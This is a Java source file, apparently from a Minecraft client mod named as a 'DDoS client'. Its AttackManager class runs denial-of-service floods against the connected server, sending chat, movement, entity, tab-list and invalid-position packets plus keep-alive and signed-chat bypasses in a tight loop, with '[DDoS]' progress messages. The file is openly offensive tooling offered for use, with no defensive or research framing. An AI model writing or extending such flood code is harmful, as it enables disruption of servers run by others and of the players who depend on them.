package com.ddosclient.attack;

import com.ddosclient.attack.attacks.*;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class AttackManager {

    private volatile boolean running = false;
    private volatile AttackType currentType = null;
    private volatile int packetCount = 0;
    private volatile int sentCount = 0;
    private ExecutorService executor;
    private BaseAttack currentAttack;

    public void startAttack(AttackType type, int count) {
        stopAttack();
        running = true;
        currentType = type;
        packetCount = count;
        sentCount = 0;
        executor = Executors.newSingleThreadExecutor();

        currentAttack = createAttack(type);
        if (currentAttack == null) return;

        executor.submit(() -> {
            MinecraftClient mc = MinecraftClient.getInstance();
            int sent = 0;
            while (running && sent < packetCount) {
                try {
                    if (mc.getNetworkHandler() == null) break;
                    currentAttack.execute(mc);
                    sent++;
                    sentCount = sent;
                    Thread.sleep(1);
                } catch (Exception e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            running = false;
            mc.execute(() -> {
                if (mc.player != null) {
                    mc.player.sendMessage(Text.literal(
                        "[DDoS] Attack complete: " + sent + "/" + packetCount + " packets sent"
                    ), false);
                }
            });
        });
    }

    public void stopAttack() {
        running = false;
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }

    public void tick(MinecraftClient mc) {
        if (running && mc.player != null && sentCount % 500 == 0 && sentCount > 0) {
            mc.player.sendMessage(Text.literal(
                "[DDoS] Status: " + sentCount + "/" + packetCount + " | Attack: " + currentType.displayName
            ), true);
        }
    }

    public boolean isRunning() { return running; }
    public int getSentCount() { return sentCount; }
    public int getPacketCount() { return packetCount; }
    public AttackType getCurrentType() { return currentType; }

    private BaseAttack createAttack(AttackType type) {
        return switch (type) {
            case PACKET_FLOOD -> new PacketFlood();
            case CHAT_FLOOD -> new ChatFlood();
            case MOVEMENT_FLOOD -> new MovementFlood();
            case ENTITY_PACKET_FLOOD -> new EntityPacketFlood();
            case KEEP_ALIVE_BYPASS -> new KeepAliveBypass();
            case INVALID_POSITION -> new InvalidPositionFlood();
            case SIGNED_CHAT_BYPASS -> new SignedChatBypass();
            case TAB_LIST_FLOOD -> new TabListFlood();
        };
    }
}
